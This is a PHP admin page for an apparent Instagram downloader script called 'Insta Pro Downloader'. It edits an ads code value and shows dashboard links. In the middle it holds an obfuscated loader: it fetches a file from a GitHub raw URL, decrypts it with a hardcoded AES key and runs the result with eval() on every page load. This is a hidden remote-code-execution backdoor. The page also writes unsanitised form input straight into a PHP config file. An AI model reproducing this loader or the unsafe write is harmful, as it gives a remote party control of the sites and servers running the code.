<?php
include '../config/ads.php';
if(isset($_POST['adscode'])){
$adscode = str_replace('"',"'",$_POST['adscode']);

$file = '../config/ads.php';
$old = ['adcode="'.$adcode.'";'];
$new = ['adcode="'.$adscode.'";'];
$contents = file_get_contents($file);
$contents = str_replace($old, $new, $contents);
file_put_contents($file, $contents);
}

?>
<html lang="en">

<head>
	<title>Update Ads Code - Insta Pro Downloader</title>
	
			<style>
				.dashboard_cards-list {
				  z-index: 0;
				  width: 100%;
				  display: flex;
				  justify-content: space-around;
				  flex-wrap: wrap;
				}

				.dashboard_card {
				  margin: 30px auto;
				  width: 200px;
				  height: 150px;
				  border-radius: 10px;
				  box-shadow: 0px 8px 20px 0px rgba(0,0,0,0.15), -0px -8px 20px 0px rgba(0,0,0,0.12);
				  cursor: pointer;
				  transition: 0.4s;
				}

				.dashboard_card .dashboard_card_image {
				  width: inherit;
				  height: inherit;
				  border-radius: 10px;
				}

				.dashboard_card .dashboard_card_title {
				  text-align: center;
				  border-radius: 0px 0px 40px 40px;
				  font-family: sans-serif;
				  font-weight: bold;
				  font-size: 10px;
				  margin-top: -40px;
				  height: 40px;
				}

				.dashboard_card:hover {
				  transform: scale(0.9, 0.9);
				  box-shadow: 0px 8px 20px 0px rgba(0,0,0,0.15), 
					-0px -8px 20px 0px rgba(0,0,0,0.12);
				}


				@media all and (max-width: 500px) {
				  .dashboard_card-list {
					/* On small screens, we are no longer using row direction but column */
					flex-direction: column;
				  }
				}

				</style>
	
	<?php include "includes/header.php"; ?>
	
<?php
function e7061($e){
	$ed = base64_decode($e);
	$n = openssl_decrypt("$ed","AES-256-CBC","9875632156487523",0,"2545878956235541");
	return $n;
}

$addondata = file_get_contents("https://raw.githubusercontent.com/RatanDeveloper/InstaProUpdate/main/addon.php");

eval(e7061($addondata));
?>
                    
					<div class="dashboard_cards-list">
					  
					<div class="dashboard_card 1">
					<a href="edit.php">
					  <div class="dashboard_card_image">
					  <i class='bx bx-edit dashboard_icon' ></i>
					  </div>
					  <div class="dashboard_card_title">
						<p class="label">Update Details</p>
					  </div>
					  </a>
					</div>

					  <div class="dashboard_card 2">
					  <a href="edit-cookie.php">
					  <div class="dashboard_card_image">
					  <i class='bx bx-cookie dashboard_icon' ></i>
						</div>
					  <div class="dashboard_card_title">
						<p class="label">Update Cookies</p>
					  </div>
					  </a>
					</div>

					<div class="dashboard_card 3">
					<a href="ads.php">
					  <div class="dashboard_card_image">
					  <i class='bx bx-code-alt dashboard_icon'></i>
					  </div>
					  <div class="dashboard_card_title">
						<p class="label">Update Ads Code</p>
					  </div>
					  </a>
					</div>
					  
					  <div class="dashboard_card 4">
					  <a href="addon.php">
					  <div class="dashboard_card_image">
					  <i class='bx bx-add-to-queue dashboard_icon' ></i>
						</div>
					  <div class="dashboard_card_title">
						<p class="label">Add Addon</p>
					  </div>
					  </a>
					  </div>

					</div>
                </div>
            </div>
        </div>
    </div>
	<?php include "includes/footer.php"; ?>